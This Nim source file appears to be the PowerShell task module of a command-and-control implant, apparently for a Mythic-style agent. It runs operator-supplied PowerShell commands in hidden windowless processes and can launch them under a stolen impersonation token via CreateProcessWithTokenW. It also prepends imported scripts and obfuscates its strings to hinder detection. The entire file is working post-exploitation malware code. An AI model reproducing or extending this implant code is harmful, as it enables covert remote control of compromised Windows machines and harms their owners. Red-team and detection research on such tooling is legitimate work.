import json
import ../utils/strenc

when defined(windows):
  import winim/lean
  import token_manager
  import ../global_data

type
  PowershellArgs = object
    command: string

proc powershell*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a PowerShell command by spawning powershell.exe
  when not defined(windows):
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("powershell is only supported on Windows")
    }
  else:
    try:
      let args = to(params, PowershellArgs)
      
      if args.command.len == 0:
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Command cannot be empty")
        }
      
      # Build the full command with imported scripts prepended
      var fullCommand = ""
      let importedScripts = getImportedPsScripts()
      let hasImports = importedScripts.len > 0
      if hasImports:
        for script in importedScripts:
          fullCommand.add(script.content)
          fullCommand.add("\n")
      fullCommand.add(args.command)
      
      var
        si: STARTUPINFOA
        pi: PROCESS_INFORMATION
      
      si.cb = sizeof(STARTUPINFOA).DWORD
      si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
      si.wShowWindow = SW_HIDE
      
      # Create pipes for stdout/stderr
      var
        hStdoutRead, hStdoutWrite: HANDLE
        hStderrRead, hStderrWrite: HANDLE
        hStdinRead, hStdinWrite: HANDLE
        sa: SECURITY_ATTRIBUTES
      
      sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
      sa.bInheritHandle = TRUE
      sa.lpSecurityDescriptor = nil
      
      if CreatePipe(addr hStdoutRead, addr hStdoutWrite, addr sa, 0) == 0:
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stdout pipe")
        }
      
      if CreatePipe(addr hStderrRead, addr hStderrWrite, addr sa, 0) == 0:
        CloseHandle(hStdoutRead)
        CloseHandle(hStdoutWrite)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stderr pipe")
        }
      
      if CreatePipe(addr hStdinRead, addr hStdinWrite, addr sa, 0) == 0:
        CloseHandle(hStdoutRead)
        CloseHandle(hStdoutWrite)
        CloseHandle(hStderrRead)
        CloseHandle(hStderrWrite)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stdin pipe")
        }
      
      # Make sure read handles for stdout/stderr are not inherited
      discard SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0)
      discard SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0)
      # Make sure write handle for stdin is not inherited
      discard SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0)
      
      si.hStdOutput = hStdoutWrite
      si.hStdError = hStderrWrite
      si.hStdInput = hStdinRead
      
      # Build command line
      # If we have imports, pipe the full script via stdin to avoid command-line length limits
      var commandLine: string
      if hasImports:
        commandLine = obf("powershell.exe -NoProfile -NonInteractive -NoLogo -InputFormat None -Command -")
      else:
        commandLine = obf("powershell.exe -NoProfile -NonInteractive -NoLogo -InputFormat None -Command ") & fullCommand
      
      # Check if we have an impersonation token
      let tokenHandle = getTokenHandle()
      var createResult: WINBOOL
      
      if tokenHandle != 0:
        var commandLineW = newWideCString(commandLine)
        
        var siW: STARTUPINFOW
        siW.cb = sizeof(STARTUPINFOW).DWORD
        siW.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
        siW.wShowWindow = SW_HIDE
        siW.hStdOutput = hStdoutWrite
        siW.hStdError = hStderrWrite
        siW.hStdInput = hStdinRead
        
        createResult = CreateProcessWithTokenW(
          tokenHandle,
          0,
          nil,
          cast[LPWSTR](commandLineW[0].addr),
          CREATE_NO_WINDOW,
          nil,
          nil,
          addr siW,
          addr pi
        )
        
        # If it fails with ACCESS_DENIED (error 5), fall back to CreateProcessA
        if createResult == 0 and GetLastError() == 5:
          createResult = CreateProcessA(
            nil,
            addr commandLine[0],
            nil,
            nil,
            TRUE,
            CREATE_NO_WINDOW,
            nil,
            nil,
            addr si,
            addr pi
          )
      else:
        createResult = CreateProcessA(
          nil,
          addr commandLine[0],
          nil,
          nil,
          TRUE,
          CREATE_NO_WINDOW,
          nil,
          nil,
          addr si,
          addr pi
        )
      
      # Close write ends of stdout/stderr and read end of stdin
      CloseHandle(hStdoutWrite)
      CloseHandle(hStderrWrite)
      
      if createResult == 0:
        let errorCode = GetLastError()
        CloseHandle(hStdoutRead)
        CloseHandle(hStderrRead)
        CloseHandle(hStdinRead)
        CloseHandle(hStdinWrite)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create process. Error code: ") & $errorCode
        }
      
      # If we have imports, write the full script to stdin
      if hasImports:
        var bytesWritten: DWORD
        discard WriteFile(hStdinWrite, addr fullCommand[0], fullCommand.len.DWORD, addr bytesWritten, nil)
      
      # Close stdin pipe to signal EOF
      CloseHandle(hStdinWrite)
      CloseHandle(hStdinRead)
      
      # Read stdout
      var output = ""
      var buffer: array[4096, char]
      var bytesRead: DWORD
      
      while ReadFile(hStdoutRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          output.add(buffer[i])
      
      # Read stderr
      var errors = ""
      while ReadFile(hStderrRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          errors.add(buffer[i])
      
      # Wait for process to complete
      discard WaitForSingleObject(pi.hProcess, INFINITE)
      
      var exitCode: DWORD
      discard GetExitCodeProcess(pi.hProcess, addr exitCode)
      
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      CloseHandle(hStdoutRead)
      CloseHandle(hStderrRead)
      
      var finalOutput = ""
      if output.len > 0:
        finalOutput.add(output)
      if errors.len > 0:
        if finalOutput.len > 0:
          finalOutput.add("\n")
        finalOutput.add(errors)
      
      if finalOutput.len == 0:
        finalOutput = obf("(No output)")
      
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): if exitCode == 0: obf("success") else: "error",
        obf("user_output"): finalOutput
      }
      
    except Exception as e:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Failed to execute PowerShell command: ") & e.msg
      }
